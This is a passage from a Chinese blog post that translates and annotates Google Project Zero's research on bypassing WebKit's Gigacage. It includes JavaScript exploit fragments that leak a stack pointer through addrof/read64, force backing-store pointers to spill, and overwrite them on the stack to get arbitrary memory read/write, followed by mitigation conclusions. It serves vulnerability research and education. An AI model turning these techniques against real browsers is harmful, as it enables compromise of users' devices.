<p>有趣的是，对 TypedArray 的访问已被拆分为三个不同的操作：对索引的边界检查、一个 <code>GetIndexedPropertyStorage</code> 操作（负责获取和取消 caged 的后备存储指针）以及一个 <code>GetByVal</code> 操作（它本质上会转换为单个内存加载指令）。 假设 r0 包含指向 TypedArray <code>a</code> 的指针，则上述 IR（中间表示）将导致大致如下的机器代码：</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; bounds<span class="built_in"> check </span>omitted</span><br><span class="line"><span class="class">Lda r2, [r0 + 24];</span></span><br><span class="line">; Uncage<span class="built_in"> and </span>unPAC r2 here</span><br><span class="line">Lda r0, [r2]</span><br><span class="line">B lr</span><br></pre></td></tr></table></figure>

<p>然而，如果没有可用的通用寄存器供 <code>GetIndexedPropertyStorage</code> 存储原始指针，会发生什么情况？ 在这种情况下，指针将不得不溢出到堆栈。 这可能允许具有损坏堆栈内存能力的攻击者通过在由 <code>GetByVal</code> 或 <code>SetByVal</code> 操作访问内存之前修改堆栈上溢出的指针来突破两个 cage。</p>
<p>本博客文章的其余部分将描述如何在实践中实现这种攻击。 为此，必须解决三个主要挑战：</p>
<ul>
<li>泄漏一个堆栈指针，以便找到并损坏堆栈上溢出的值</li>
<li>分离 <code>GetIndexedPropertyStorage</code> 和 <code>GetByVal</code> 操作，以便修改溢出指针的代码可以在两者之间执行</li>
<li>强制将取消 caged 的存储指针溢出到堆栈</li>
</ul>
<h4 id="寻找堆栈"><a href="#寻找堆栈" class="headerlink" title="寻找堆栈"></a>寻找堆栈</h4><p>事实证明，在给定任意堆读取&#x2F;写入的情况下，在 JSC 中查找指向堆栈的指针相当容易：VM 对象的 <code>topCallFrame</code> 成员实际上是指向堆栈的指针，因为 JSC 解释器使用本机堆栈，因此顶部的 JS 调用帧也基本上是主线程堆栈的顶部。 因此，找到堆栈就像从全局对象到 VM 实例遵循指针链一样容易：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable language_">global</span> = <span class="title class_">Function</span>(<span class="string">&#x27;return this&#x27;</span>)();</span><br><span class="line"><span class="keyword">let</span> js_glob_obj_addr = <span class="title function_">addrof</span>(<span class="variable language_">global</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> glob_obj_addr = <span class="title function_">read64</span>(<span class="title class_">Add</span>(js_glob_obj_addr, </span><br><span class="line">    offsets.<span class="property">JS_GLOBAL_OBJ_TO_GLOBAL_OBJ</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> vm_addr = <span class="title function_">read64</span>(<span class="title class_">Add</span>(glob_obj_addr, offsets.<span class="property">GLOBAL_OBJ_TO_VM</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> vm_top_call_frame_addr = <span class="title class_">Add</span>(vm_addr, </span><br><span class="line">    offsets.<span class="property">VM_TO_TOP_CALL_FRAME</span>);</span><br><span class="line"><span class="keyword">let</span> vm_top_call_frame_addr_dbl = vm_top_call_frame_addr.<span class="title function_">asDouble</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> stack_ptr = <span class="title function_">read64</span>(vm_top_call_frame_addr);</span><br><span class="line"><span class="title function_">log</span>(<span class="string">`[*] Top CallFrame (stack) @ <span class="subst">$&#123;stack_ptr&#125;</span>`</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="分离TypeArray访问操作"><a href="#分离TypeArray访问操作" class="headerlink" title="分离TypeArray访问操作"></a>分离TypeArray访问操作</h4><p>对于上面简单地在索引处访问类型化数组一次（即 a[0]）的 <code>opt</code> 函数，<code>GetIndexedPropertyStorage</code> 操作将直接跟随 <code>GetByVal</code> 操作，因此即使它溢出到堆栈上，也无法破坏 uncaged 的指针。 然而，以下代码已经设法分离了这两个操作：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    a[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Spill code here</span></span><br><span class="line"></span><br><span class="line">    a[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此代码最初将生成以下DFG IR：</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v0 = GetIndexedPropertyStorage a </span><br><span class="line">GetByVal v0, 0</span><br><span class="line"></span><br><span class="line">// Spill code here</span><br><span class="line"></span><br><span class="line">v1 = GetIndexedPropertyStorage a</span><br><span class="line">GetByVal v1, 1</span><br></pre></td></tr></table></figure>

<p>然后，在优化管道中稍后，两个 <code>GetIndexedPropertyStorage</code> 操作将被 CSE（公共子表达式消除）为一个，从而将第二个 <code>GetByVal</code> 与 <code>GetIndexedPropertyStorage</code> 操作分离：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v0 = GetIndexedPropertyStorage <span class="keyword">a</span></span><br><span class="line">GetByVal v0, <span class="number">0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">// Spill code here</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">// Then walk over stack here and replace backing storage pointer</span></span><br><span class="line"></span><br><span class="line">GetByVal v0, <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>但是，只有当溢出代码不修改全局状态时，才会发生这种情况，因为这可能会分离 TypedArray 的缓冲区，从而使其后备存储指针无效。 在这种情况下，编译器将被迫为第二个 <code>GetByVal</code> 重新加载后备存储指针。 因此，不可能运行完全任意的代码来强制溢出，但如下所示，这不是问题。 还值得注意的是，这里必须使用两个不同的索引，否则 <code>GetByVal</code> 也可以进行 CSE。</p>
<h4 id="溢出寄存器"><a href="#溢出寄存器" class="headerlink" title="溢出寄存器"></a>溢出寄存器</h4><p>完成前两个步骤后，剩下的问题是如何强制溢出由 <code>GetIndexedPropertyStorage</code> 生成的 uncaged 指针。 一种在仍然允许 CSE 发生的同时强制溢出的方法是执行一些简单的数学计算，这些计算需要保持大量的临时值。 以下代码以一种时尚的方式完成了这一点：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="number">0</span>; <span class="comment">// Placeholder, needed for the ascii art =)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r0=i,r1=r0,r2=r1+r0,r3=r2+r1,r4=r3+r0,r5=r4+r3,r6=r5+r2,r7=r6+r1,r8=r7+r0;</span><br><span class="line"><span class="keyword">let</span> r9=            r8+   r7,r10=r9+r6,r11=r10+r5,   r12   =r11+p      +r4+p+p;</span><br><span class="line"><span class="keyword">let</span> r13   =r12+p   +r3,   r14=r13+r2,r15=r14+r1,   r16=   r15+p   +   r0+p+p+p;</span><br><span class="line"><span class="keyword">let</span> r17   =r16+p   +r15,   r18=r17+r15,r19=r18+   r14+p   ,r20   =p   +r19+r13;</span><br><span class="line"><span class="keyword">let</span> r21   =r19+p   +r12 ,   r22=p+      r21+p+   r11+p,   r23   =p+   r22+r10;</span><br><span class="line"><span class="keyword">let</span> r24            =r23+r9   ,r25   =p   +r24   +r8+p+p   +p   ,r26   =r25+r7;</span><br><span class="line"><span class="keyword">let</span> r27   =r26+r6,r28=r27+p   +p   +r5+   p,   r29=r28+   p    +r4+   p+p+p+p;</span><br><span class="line"><span class="keyword">let</span> r30   =r29+r3,r31=r30+r2      ,r32=p      +r31+r1+p      ,r33=p   +r32+r0;</span><br><span class="line"><span class="keyword">let</span> r34=r33+r32,r35=r34+r31,r36=r25+r30,r37=r36+r29,r38=r37+r28,r39=r38+r27+p;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r = r39; <span class="comment">// Keep the entire computation alive, or nothing will be spilled.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>计算的序列在某种程度上类似于斐波那契数列，但需要保持中间结果的活跃，因为它们稍后会在序列中再次用到。 不幸的是，这种方法有些脆弱，因为引擎各个部分（尤其是寄存器分配器）的不相关更改很容易破坏堆栈溢出。</p>
<p>还有另一种更简单的方法（尽管可能性能稍差且肯定不那么赏心悦目），几乎可以保证原始存储指针将被溢出到堆栈：只需访问与通用寄存器一样多的 TypedArray，而不是只有一个。 在这种情况下，由于没有足够的寄存器来容纳所有原始后备存储指针，因此其中一些必须溢出到堆栈，在那里它们可以被找到并替换。 这种方法的原始版本如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">typed_array1[<span class="number">0</span>];</span><br><span class="line">typed_array2[<span class="number">0</span>];</span><br><span class="line">...;</span><br><span class="line">typed_arrayN[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Walk over stack, find and replace spilled backing storage pointer</span></span><br><span class="line"><span class="keyword">let</span> stack = ...;   <span class="comment">// JSArray pointing into stack</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stack[i] == old_ptr) &#123;</span><br><span class="line">        stack[i] = new_ptr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typed_array1[<span class="number">0</span>] = val_to_write;</span><br><span class="line">typed_array2[<span class="number">0</span>] = val_to_write;</span><br><span class="line">...;</span><br><span class="line">typed_arrayN[<span class="number">0</span>] = val_to_write;</span><br></pre></td></tr></table></figure>

<p>随着主要挑战的克服，现在可以实现攻击，并且感兴趣的读者可以在本博客文章的末尾找到概念验证。 总而言之，该技术最初实现起来非常繁琐，还有一些需要注意的陷阱 - 详见 PoC。 但是，一旦实现，生成的代码就非常可靠且速度非常快，几乎可以立即在 macOS 和 iOS 以及不同的 WebKit 版本上实现真正任意的内存读取&#x2F;写入原语，而无需额外更改。</p>
<h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><p>这篇文章展示了攻击者如何（仍然）利用众所周知的 <code>addrof</code> 和 <code>fakeobj</code> 原语来获得 WebKit 中的任意内存读取&#x2F;写入。 为此，必须绕过 StructureID 缓解措施，而绕过 Gigacage 主要是可选的（但很有趣）。 从编写此漏洞利用程序到目前为止，我个人得出以下结论：</p>
<ul>
<li>StructureID 随机化目前似乎非常薄弱。 由于大量的类型信息存储在 JSCell 位中，因此攻击者可以预测这些信息，因此似乎可以找到并滥用许多其他不需要有效 StructureID 的操作。 此外，可以转化为堆越界读取的错误很可能用于泄漏有效的 StructureID。</li>
<li>就目前而言，Gigacage 作为安全缓解措施的目的对我来说并不完全清楚，因为可以从不受 Gigacage 约束的普通 JSArray 构建（几乎）任意的读取&#x2F;写入原语。 在这一点上，正如这里所演示的，Gigacage 也可以被完全绕过，即使这在实践中可能不是必需的。</li>
<li>我认为值得调查删除未装箱的双精度 JSArray 以及正确 caging 其余 JSArray 类型（它们都存储“已装箱”的 JSValue）的影响（包括对安全性和性能的影响）。 这可能会使 StructureID 随机化和 Gigacage 都变得更强大。 在此漏洞利用的情况下，这将首先阻止 <code>addrof</code> 和 <code>fakeobj</code> 原语的构造（因为双精度 &lt;-&gt; JSValue 类型混淆将不再能够构造），以及通过 JSArray 进行的有限读取&#x2F;写入，并且还将阻止通过 OOB 访问到 JSArray 中泄漏有效的 StructureID（可以说是 OOB 访问最常见的场景）。</li>
</ul>
<p>本系列的最后一部分将展示如何在存在 PAC 和 APRR 等更多缓解措施的情况下，从读取&#x2F;写入中获得 PC 控制。</p>
<p>翻译自（+了些个人理解）：<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/09/jitsploitation-two.html">JITSpoitation II</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Lobo Q1ng</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2025 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Hello~,<strong>DESTINY</strong></span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"># 漏洞复现</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2025/03/05/Fuzzilli%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/">Fuzzilli：论文阅读</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Lobo Q1ng | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>